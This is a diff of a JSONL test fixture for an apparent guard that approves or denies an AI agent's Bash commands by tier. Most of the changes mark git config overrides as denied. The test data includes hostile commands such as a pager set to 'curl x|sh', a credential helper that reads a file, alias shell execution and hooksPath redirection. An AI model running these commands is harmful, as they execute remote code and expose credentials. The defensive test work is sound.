@@ -510,28 +510,28 @@
 {"id": "E15-delsecret-relaxed", "tool": "Bash", "tool_input": {"command": "gh secret delete X"}, "tier": "relaxed", "headless": false, "want": "-"}
 {"id": "E15-delsecret-medium", "tool": "Bash", "tool_input": {"command": "gh secret delete X"}, "tier": "medium", "headless": false, "want": "-"}
 {"id": "E15-delsecret-high", "tool": "Bash", "tool_input": {"command": "gh secret delete X"}, "tier": "high", "headless": false, "want": "-"}
-{"id": "E7-00-off", "tool": "Bash", "tool_input": {"command": "git config core.hooksPath .hooks"}, "tier": "off", "headless": false, "want": "A"}
-{"id": "E7-00-relaxed", "tool": "Bash", "tool_input": {"command": "git config core.hooksPath .hooks"}, "tier": "relaxed", "headless": false, "want": "A"}
+{"id": "E7-00-off", "tool": "Bash", "tool_input": {"command": "git config core.hooksPath .hooks"}, "tier": "off", "headless": false, "want": "D"}
+{"id": "E7-00-relaxed", "tool": "Bash", "tool_input": {"command": "git config core.hooksPath .hooks"}, "tier": "relaxed", "headless": false, "want": "D"}
 {"id": "E7-00-medium", "tool": "Bash", "tool_input": {"command": "git config core.hooksPath .hooks"}, "tier": "medium", "headless": false, "want": "D"}
 {"id": "E7-00-high", "tool": "Bash", "tool_input": {"command": "git config core.hooksPath .hooks"}, "tier": "high", "headless": false, "want": "D"}
 {"id": "E7-01-off", "tool": "Bash", "tool_input": {"command": "git config --global alias.co checkout"}, "tier": "off", "headless": false, "want": "A"}
 {"id": "E7-01-relaxed", "tool": "Bash", "tool_input": {"command": "git config --global alias.co checkout"}, "tier": "relaxed", "headless": false, "want": "A"}
 {"id": "E7-01-medium", "tool": "Bash", "tool_input": {"command": "git config --global alias.co checkout"}, "tier": "medium", "headless": false, "want": "D"}
 {"id": "E7-01-high", "tool": "Bash", "tool_input": {"command": "git config --global alias.co checkout"}, "tier": "high", "headless": false, "want": "D"}
-{"id": "E7-02-off", "tool": "Bash", "tool_input": {"command": "git config --file .git/config core.pager /tmp/x"}, "tier": "off", "headless": false, "want": "A"}
-{"id": "E7-02-relaxed", "tool": "Bash", "tool_input": {"command": "git config --file .git/config core.pager /tmp/x"}, "tier": "relaxed", "headless": false, "want": "A"}
+{"id": "E7-02-off", "tool": "Bash", "tool_input": {"command": "git config --file .git/config core.pager /tmp/x"}, "tier": "off", "headless": false, "want": "D"}
+{"id": "E7-02-relaxed", "tool": "Bash", "tool_input": {"command": "git config --file .git/config core.pager /tmp/x"}, "tier": "relaxed", "headless": false, "want": "D"}
 {"id": "E7-02-medium", "tool": "Bash", "tool_input": {"command": "git config --file .git/config core.pager /tmp/x"}, "tier": "medium", "headless": false, "want": "D"}
 {"id": "E7-02-high", "tool": "Bash", "tool_input": {"command": "git config --file .git/config core.pager /tmp/x"}, "tier": "high", "headless": false, "want": "D"}
-{"id": "E7-03-off", "tool": "Bash", "tool_input": {"command": "git config set core.editor /tmp/e"}, "tier": "off", "headless": false, "want": "A"}
-{"id": "E7-03-relaxed", "tool": "Bash", "tool_input": {"command": "git config set core.editor /tmp/e"}, "tier": "relaxed", "headless": false, "want": "A"}
+{"id": "E7-03-off", "tool": "Bash", "tool_input": {"command": "git config set core.editor /tmp/e"}, "tier": "off", "headless": false, "want": "D"}
+{"id": "E7-03-relaxed", "tool": "Bash", "tool_input": {"command": "git config set core.editor /tmp/e"}, "tier": "relaxed", "headless": false, "want": "D"}
 {"id": "E7-03-medium", "tool": "Bash", "tool_input": {"command": "git config set core.editor /tmp/e"}, "tier": "medium", "headless": false, "want": "D"}
 {"id": "E7-03-high", "tool": "Bash", "tool_input": {"command": "git config set core.editor /tmp/e"}, "tier": "high", "headless": false, "want": "D"}
-{"id": "E7-04-off", "tool": "Bash", "tool_input": {"command": "git config --edit"}, "tier": "off", "headless": false, "want": "A"}
-{"id": "E7-04-relaxed", "tool": "Bash", "tool_input": {"command": "git config --edit"}, "tier": "relaxed", "headless": false, "want": "A"}
+{"id": "E7-04-off", "tool": "Bash", "tool_input": {"command": "git config --edit"}, "tier": "off", "headless": false, "want": "D"}
+{"id": "E7-04-relaxed", "tool": "Bash", "tool_input": {"command": "git config --edit"}, "tier": "relaxed", "headless": false, "want": "D"}
 {"id": "E7-04-medium", "tool": "Bash", "tool_input": {"command": "git config --edit"}, "tier": "medium", "headless": false, "want": "D"}
 {"id": "E7-04-high", "tool": "Bash", "tool_input": {"command": "git config --edit"}, "tier": "high", "headless": false, "want": "D"}
-{"id": "E7-05-off", "tool": "Bash", "tool_input": {"command": "git -c core.fsmonitor=/tmp/x status"}, "tier": "off", "headless": false, "want": "A"}
-{"id": "E7-05-relaxed", "tool": "Bash", "tool_input": {"command": "git -c core.fsmonitor=/tmp/x status"}, "tier": "relaxed", "headless": false, "want": "A"}
+{"id": "E7-05-off", "tool": "Bash", "tool_input": {"command": "git -c core.fsmonitor=/tmp/x status"}, "tier": "off", "headless": false, "want": "D"}
+{"id": "E7-05-relaxed", "tool": "Bash", "tool_input": {"command": "git -c core.fsmonitor=/tmp/x status"}, "tier": "relaxed", "headless": false, "want": "D"}
 {"id": "E7-05-medium", "tool": "Bash", "tool_input": {"command": "git -c core.fsmonitor=/tmp/x status"}, "tier": "medium", "headless": false, "want": "D"}
 {"id": "E7-05-high", "tool": "Bash", "tool_input": {"command": "git -c core.fsmonitor=/tmp/x status"}, "tier": "high", "headless": false, "want": "D"}
 {"id": "E7-06-off", "tool": "Bash", "tool_input": {"command": "git config credential.helper store"}, "tier": "off", "headless": false, "want": "A"}
@@ -542,6 +542,23 @@
 {"id": "E7-read-relaxed", "tool": "Bash", "tool_input": {"command": "git config core.pager"}, "tier": "relaxed", "headless": false, "want": "-"}
 {"id": "E7-read-medium", "tool": "Bash", "tool_input": {"command": "git config core.pager"}, "tier": "medium", "headless": false, "want": "-"}
 {"id": "E7-read-high", "tool": "Bash", "tool_input": {"command": "git config core.pager"}, "tier": "high", "headless": false, "want": "-"}
+{"id": "E7-07-off", "tool": "Bash", "tool_input": {"command": "git config --global core.sshCommand 'ssh -i /tmp/k -o ProxyCommand=x'"}, "tier": "off", "headless": false, "want": "D"}
+{"id": "E7-07-relaxed", "tool": "Bash", "tool_input": {"command": "git config --global core.sshCommand 'ssh -i /tmp/k -o ProxyCommand=x'"}, "tier": "relaxed", "headless": false, "want": "D"}
+{"id": "E7-07-medium", "tool": "Bash", "tool_input": {"command": "git config --global core.sshCommand 'ssh -i /tmp/k -o ProxyCommand=x'"}, "tier": "medium", "headless": false, "want": "D"}
+{"id": "E7-07-high", "tool": "Bash", "tool_input": {"command": "git config --global core.sshCommand 'ssh -i /tmp/k -o ProxyCommand=x'"}, "tier": "high", "headless": false, "want": "D"}
+{"id": "E7-08-off", "tool": "Bash", "tool_input": {"command": "git config alias.st '!sh -c id'"}, "tier": "off", "headless": false, "want": "D"}
+{"id": "E7-08-relaxed", "tool": "Bash", "tool_input": {"command": "git config alias.st '!sh -c id'"}, "tier": "relaxed", "headless": false, "want": "D"}
+{"id": "E7-08-medium", "tool": "Bash", "tool_input": {"command": "git config alias.st '!sh -c id'"}, "tier": "medium", "headless": false, "want": "D"}
+{"id": "E7-08-high", "tool": "Bash", "tool_input": {"command": "git config alias.st '!sh -c id'"}, "tier": "high", "headless": false, "want": "D"}
+{"id": "E7-09-off", "tool": "Bash", "tool_input": {"command": "git -c alias.co=checkout co main"}, "tier": "off", "headless": false, "want": "A"}
+{"id": "E7-09-relaxed", "tool": "Bash", "tool_input": {"command": "git -c alias.co=checkout co main"}, "tier": "relaxed", "headless": false, "want": "A"}
+{"id": "E7-09-medium", "tool": "Bash", "tool_input": {"command": "git -c alias.co=checkout co main"}, "tier": "medium", "headless": false, "want": "D"}
+{"id": "E7-09-high", "tool": "Bash", "tool_input": {"command": "git -c alias.co=checkout co main"}, "tier": "high", "headless": false, "want": "D"}
+{"id": "E7-10-off", "tool": "Bash", "tool_input": {"command": "git config credential.helper '!f() { cat ~/.t; }; f'"}, "tier": "off", "headless": false, "want": "D"}
+{"id": "E7-10-relaxed", "tool": "Bash", "tool_input": {"command": "git config credential.helper '!f() { cat ~/.t; }; f'"}, "tier": "relaxed", "headless": false, "want": "D"}
+{"id": "E7-10-medium", "tool": "Bash", "tool_input": {"command": "git config credential.helper '!f() { cat ~/.t; }; f'"}, "tier": "medium", "headless": false, "want": "D"}
+{"id": "E7-10-high", "tool": "Bash", "tool_input": {"command": "git config credential.helper '!f() { cat ~/.t; }; f'"}, "tier": "high", "headless": false, "want": "D"}
+{"id": "E7-09-hl", "tool": "Bash", "tool_input": {"command": "git -c alias.co=checkout co main"}, "tier": "relaxed", "headless": true, "want": "D"}
 {"id": "FL-none-00-off", "tool": "Bash", "tool_input": {"command": "git restore --staged src/lib.rs"}, "tier": "off", "headless": false, "want": "-"}
 {"id": "FL-none-00-relaxed", "tool": "Bash", "tool_input": {"command": "git restore --staged src/lib.rs"}, "tier": "relaxed", "headless": false, "want": "-"}
 {"id": "FL-none-00-medium", "tool": "Bash", "tool_input": {"command": "git restore --staged src/lib.rs"}, "tier": "medium", "headless": false, "want": "-"}
@@ -610,48 +627,48 @@
 {"id": "P-cfg-00-relaxed", "tool": "Bash", "tool_input": {"command": "git config aLiAs.co checkout"}, "tier": "relaxed", "headless": false, "want": "A"}
 {"id": "P-cfg-00-medium", "tool": "Bash", "tool_input": {"command": "git config aLiAs.co checkout"}, "tier": "medium", "headless": false, "want": "D"}
 {"id": "P-cfg-00-high", "tool": "Bash", "tool_input": {"command": "git config aLiAs.co checkout"}, "tier": "high", "headless": false, "want": "D"}
-{"id": "P-cfg-01-off", "tool": "Bash", "tool_input": {"command": "git config --edit"}, "tier": "off", "headless": false, "want": "A"}
-{"id": "P-cfg-01-relaxed", "tool": "Bash", "tool_input": {"command": "git config --edit"}, "tier": "relaxed", "headless": false, "want": "A"}
+{"id": "P-cfg-01-off", "tool": "Bash", "tool_input": {"command": "git config --edit"}, "tier": "off", "headless": false, "want": "D"}
+{"id": "P-cfg-01-relaxed", "tool": "Bash", "tool_input": {"command": "git config --edit"}, "tier": "relaxed", "headless": false, "want": "D"}
 {"id": "P-cfg-01-medium", "tool": "Bash", "tool_input": {"command": "git config --edit"}, "tier": "medium", "headless": false, "want": "D"}
 {"id": "P-cfg-01-high", "tool": "Bash", "tool_input": {"command": "git config --edit"}, "tier": "high", "headless": false, "want": "D"}
-{"id": "P-cfg-02-off", "tool": "Bash", "tool_input": {"command": "git config -e"}, "tier": "off", "headless": false, "want": "A"}
-{"id": "P-cfg-02-relaxed", "tool": "Bash", "tool_input": {"command": "git config -e"}, "tier": "relaxed", "headless": false, "want": "A"}
+{"id": "P-cfg-02-off", "tool": "Bash", "tool_input": {"command": "git config -e"}, "tier": "off", "headless": false, "want": "D"}
+{"id": "P-cfg-02-relaxed", "tool": "Bash", "tool_input": {"command": "git config -e"}, "tier": "relaxed", "headless": false, "want": "D"}
 {"id": "P-cfg-02-medium", "tool": "Bash", "tool_input": {"command": "git config -e"}, "tier": "medium", "headless": false, "want": "D"}
 {"id": "P-cfg-02-high", "tool": "Bash", "tool_input": {"command": "git config -e"}, "tier": "high", "headless": false, "want": "D"}
-{"id": "P-cfg-03-off", "tool": "Bash", "tool_input": {"command": "git config --global --edit"}, "tier": "off", "headless": false, "want": "A"}
-{"id": "P-cfg-03-relaxed", "tool": "Bash", "tool_input": {"command": "git config --global --edit"}, "tier": "relaxed", "headless": false, "want": "A"}
+{"id": "P-cfg-03-off", "tool": "Bash", "tool_input": {"command": "git config --global --edit"}, "tier": "off", "headless": false, "want": "D"}
+{"id": "P-cfg-03-relaxed", "tool": "Bash", "tool_input": {"command": "git config --global --edit"}, "tier": "relaxed", "headless": false, "want": "D"}
 {"id": "P-cfg-03-medium", "tool": "Bash", "tool_input": {"command": "git config --global --edit"}, "tier": "medium", "headless": false, "want": "D"}
 {"id": "P-cfg-03-high", "tool": "Bash", "tool_input": {"command": "git config --global --edit"}, "tier": "high", "headless": false, "want": "D"}
-{"id": "P-cfg-04-off", "tool": "Bash", "tool_input": {"command": "git config edit"}, "tier": "off", "headless": false, "want": "A"}
-{"id": "P-cfg-04-relaxed", "tool": "Bash", "tool_input": {"command": "git config edit"}, "tier": "relaxed", "headless": false, "want": "A"}
+{"id": "P-cfg-04-off", "tool": "Bash", "tool_input": {"command": "git config edit"}, "tier": "off", "headless": false, "want": "D"}
+{"id": "P-cfg-04-relaxed", "tool": "Bash", "tool_input": {"command": "git config edit"}, "tier": "relaxed", "headless": false, "want": "D"}
 {"id": "P-cfg-04-medium", "tool": "Bash", "tool_input": {"command": "git config edit"}, "tier": "medium", "headless": false, "want": "D"}
 {"id": "P-cfg-04-high", "tool": "Bash", "tool_input": {"command": "git config edit"}, "tier": "high", "headless": false, "want": "D"}
-{"id": "P-cfg-05-off", "tool": "Bash", "tool_input": {"command": "git config --rename-section foo core"}, "tier": "off", "headless": false, "want": "A"}
-{"id": "P-cfg-05-relaxed", "tool": "Bash", "tool_input": {"command": "git config --rename-section foo core"}, "tier": "relaxed", "headless": false, "want": "A"}
+{"id": "P-cfg-05-off", "tool": "Bash", "tool_input": {"command": "git config --rename-section foo core"}, "tier": "off", "headless": false, "want": "D"}
+{"id": "P-cfg-05-relaxed", "tool": "Bash", "tool_input": {"command": "git config --rename-section foo core"}, "tier": "relaxed", "headless": false, "want": "D"}
 {"id": "P-cfg-05-medium", "tool": "Bash", "tool_input": {"command": "git config --rename-section foo core"}, "tier": "medium", "headless": false, "want": "D"}
 {"id": "P-cfg-05-high", "tool": "Bash", "tool_input": {"command": "git config --rename-section foo core"}, "tier": "high", "headless": false, "want": "D"}
-{"id": "P-cfg-06-off", "tool": "Bash", "tool_input": {"command": "git --shallow-file x config core.hooksPath .evil"}, "tier": "off", "headless": false, "want": "A"}
-{"id": "P-cfg-06-relaxed", "tool": "Bash", "tool_input": {"command": "git --shallow-file x config core.hooksPath .evil"}, "tier": "relaxed", "headless": false, "want": "A"}
+{"id": "P-cfg-06-off", "tool": "Bash", "tool_input": {"command": "git --shallow-file x config core.hooksPath .evil"}, "tier": "off", "headless": false, "want": "D"}
+{"id": "P-cfg-06-relaxed", "tool": "Bash", "tool_input": {"command": "git --shallow-file x config core.hooksPath .evil"}, "tier": "relaxed", "headless": false, "want": "D"}
 {"id": "P-cfg-06-medium", "tool": "Bash", "tool_input": {"command": "git --shallow-file x config core.hooksPath .evil"}, "tier": "medium", "headless": false, "want": "D"}
 {"id": "P-cfg-06-high", "tool": "Bash", "tool_input": {"command": "git --shallow-file x config core.hooksPath .evil"}, "tier": "high", "headless": false, "want": "D"}
-{"id": "P-cfg-07-off", "tool": "Bash", "tool_input": {"command": "nice --adj 5 git config core.hooksPath .evil"}, "tier": "off", "headless": false, "want": "A"}
-{"id": "P-cfg-07-relaxed", "tool": "Bash", "tool_input": {"command": "nice --adj 5 git config core.hooksPath .evil"}, "tier": "relaxed", "headless": false, "want": "A"}
+{"id": "P-cfg-07-off", "tool": "Bash", "tool_input": {"command": "nice --adj 5 git config core.hooksPath .evil"}, "tier": "off", "headless": false, "want": "D"}
+{"id": "P-cfg-07-relaxed", "tool": "Bash", "tool_input": {"command": "nice --adj 5 git config core.hooksPath .evil"}, "tier": "relaxed", "headless": false, "want": "D"}
 {"id": "P-cfg-07-medium", "tool": "Bash", "tool_input": {"command": "nice --adj 5 git config core.hooksPath .evil"}, "tier": "medium", "headless": false, "want": "D"}
 {"id": "P-cfg-07-high", "tool": "Bash", "tool_input": {"command": "nice --adj 5 git config core.hooksPath .evil"}, "tier": "high", "headless": false, "want": "D"}
-{"id": "P-cfg-08-off", "tool": "Bash", "tool_input": {"command": "git --no-pager -c alias.x='!evil' x"}, "tier": "off", "headless": false, "want": "A"}
-{"id": "P-cfg-08-relaxed", "tool": "Bash", "tool_input": {"command": "git --no-pager -c alias.x='!evil' x"}, "tier": "relaxed", "headless": false, "want": "A"}
+{"id": "P-cfg-08-off", "tool": "Bash", "tool_input": {"command": "git --no-pager -c alias.x='!evil' x"}, "tier": "off", "headless": false, "want": "D"}
+{"id": "P-cfg-08-relaxed", "tool": "Bash", "tool_input": {"command": "git --no-pager -c alias.x='!evil' x"}, "tier": "relaxed", "headless": false, "want": "D"}
 {"id": "P-cfg-08-medium", "tool": "Bash", "tool_input": {"command": "git --no-pager -c alias.x='!evil' x"}, "tier": "medium", "headless": false, "want": "D"}
 {"id": "P-cfg-08-high", "tool": "Bash", "tool_input": {"command": "git --no-pager -c alias.x='!evil' x"}, "tier": "high", "headless": false, "want": "D"}
-{"id": "P-cfg-09-off", "tool": "Bash", "tool_input": {"command": "git --no-pager -c man.viewer=x --help clean"}, "tier": "off", "headless": false, "want": "A"}
-{"id": "P-cfg-09-relaxed", "tool": "Bash", "tool_input": {"command": "git --no-pager -c man.viewer=x --help clean"}, "tier": "relaxed", "headless": false, "want": "A"}
+{"id": "P-cfg-09-off", "tool": "Bash", "tool_input": {"command": "git --no-pager -c man.viewer=x --help clean"}, "tier": "off", "headless": false, "want": "D"}
+{"id": "P-cfg-09-relaxed", "tool": "Bash", "tool_input": {"command": "git --no-pager -c man.viewer=x --help clean"}, "tier": "relaxed", "headless": false, "want": "D"}
 {"id": "P-cfg-09-medium", "tool": "Bash", "tool_input": {"command": "git --no-pager -c man.viewer=x --help clean"}, "tier": "medium", "headless": false, "want": "D"}
 {"id": "P-cfg-09-high", "tool": "Bash", "tool_input": {"command": "git --no-pager -c man.viewer=x --help clean"}, "tier": "high", "headless": false, "want": "D"}
-{"id": "P-cfg-10-off", "tool": "Bash", "tool_input": {"command": "taskset 0x1 git -c core.pager=x log"}, "tier": "off", "headless": false, "want": "A"}
-{"id": "P-cfg-10-relaxed", "tool": "Bash", "tool_input": {"command": "taskset 0x1 git -c core.pager=x log"}, "tier": "relaxed", "headless": false, "want": "A"}
+{"id": "P-cfg-10-off", "tool": "Bash", "tool_input": {"command": "taskset 0x1 git -c core.pager=x log"}, "tier": "off", "headless": false, "want": "D"}
+{"id": "P-cfg-10-relaxed", "tool": "Bash", "tool_input": {"command": "taskset 0x1 git -c core.pager=x log"}, "tier": "relaxed", "headless": false, "want": "D"}
 {"id": "P-cfg-10-medium", "tool": "Bash", "tool_input": {"command": "taskset 0x1 git -c core.pager=x log"}, "tier": "medium", "headless": false, "want": "D"}
 {"id": "P-cfg-10-high", "tool": "Bash", "tool_input": {"command": "taskset 0x1 git -c core.pager=x log"}, "tier": "high", "headless": false, "want": "D"}
-{"id": "P-cfg-11-off", "tool": "Bash", "tool_input": {"command": "git -c web.browser=/tmp/b help -w log"}, "tier": "off", "headless": false, "want": "A"}
-{"id": "P-cfg-11-relaxed", "tool": "Bash", "tool_input": {"command": "git -c web.browser=/tmp/b help -w log"}, "tier": "relaxed", "headless": false, "want": "A"}
+{"id": "P-cfg-11-off", "tool": "Bash", "tool_input": {"command": "git -c web.browser=/tmp/b help -w log"}, "tier": "off", "headless": false, "want": "D"}
+{"id": "P-cfg-11-relaxed", "tool": "Bash", "tool_input": {"command": "git -c web.browser=/tmp/b help -w log"}, "tier": "relaxed", "headless": false, "want": "D"}
 {"id": "P-cfg-11-medium", "tool": "Bash", "tool_input": {"command": "git -c web.browser=/tmp/b help -w log"}, "tier": "medium", "headless": false, "want": "D"}
 {"id": "P-cfg-11-high", "tool": "Bash", "tool_input": {"command": "git -c web.browser=/tmp/b help -w log"}, "tier": "high", "headless": false, "want": "D"}
 {"id": "P-wrap-00-off", "tool": "Bash", "tool_input": {"command": "xargs --max-lines git -P clean -fdx"}, "tier": "off", "headless": false, "want": "D"}
@@ -747,12 +764,12 @@
 {"id": "R1-pager-empty-relaxed", "tool": "Bash", "tool_input": {"command": "git -c core.pager= log"}, "tier": "relaxed", "headless": false, "want": "-"}
 {"id": "R1-pager-empty-medium", "tool": "Bash", "tool_input": {"command": "git -c core.pager= log"}, "tier": "medium", "headless": false, "want": "-"}
 {"id": "R1-pager-empty-high", "tool": "Bash", "tool_input": {"command": "git -c core.pager= log"}, "tier": "high", "headless": false, "want": "-"}
-{"id": "R1-pager-evil-off", "tool": "Bash", "tool_input": {"command": "git -c core.pager='less; curl x|sh' log"}, "tier": "off", "headless": false, "want": "A"}
-{"id": "R1-pager-evil-relaxed", "tool": "Bash", "tool_input": {"command": "git -c core.pager='less; curl x|sh' log"}, "tier": "relaxed", "headless": false, "want": "A"}
+{"id": "R1-pager-evil-off", "tool": "Bash", "tool_input": {"command": "git -c core.pager='less; curl x|sh' log"}, "tier": "off", "headless": false, "want": "D"}
+{"id": "R1-pager-evil-relaxed", "tool": "Bash", "tool_input": {"command": "git -c core.pager='less; curl x|sh' log"}, "tier": "relaxed", "headless": false, "want": "D"}
 {"id": "R1-pager-evil-medium", "tool": "Bash", "tool_input": {"command": "git -c core.pager='less; curl x|sh' log"}, "tier": "medium", "headless": false, "want": "D"}
 {"id": "R1-pager-evil-high", "tool": "Bash", "tool_input": {"command": "git -c core.pager='less; curl x|sh' log"}, "tier": "high", "headless": false, "want": "D"}
-{"id": "R1-editor-evil-off", "tool": "Bash", "tool_input": {"command": "git config --global core.editor /tmp/e.sh"}, "tier": "off", "headless": false, "want": "A"}
-{"id": "R1-editor-evil-relaxed", "tool": "Bash", "tool_input": {"command": "git config --global core.editor /tmp/e.sh"}, "tier": "relaxed", "headless": false, "want": "A"}
+{"id": "R1-editor-evil-off", "tool": "Bash", "tool_input": {"command": "git config --global core.editor /tmp/e.sh"}, "tier": "off", "headless": false, "want": "D"}
+{"id": "R1-editor-evil-relaxed", "tool": "Bash", "tool_input": {"command": "git config --global core.editor /tmp/e.sh"}, "tier": "relaxed", "headless": false, "want": "D"}
 {"id": "R1-editor-evil-medium", "tool": "Bash", "tool_input": {"command": "git config --global core.editor /tmp/e.sh"}, "tier": "medium", "headless": false, "want": "D"}
 {"id": "R1-editor-evil-high", "tool": "Bash", "tool_input": {"command": "git config --global core.editor /tmp/e.sh"}, "tier": "high", "headless": false, "want": "D"}
 {"id": "R3-co-path-late-off", "tool": "Bash", "tool_input": {"command": "git checkout main -- src/lib.rs"}, "tier": "off", "headless": false, "want": "D"}
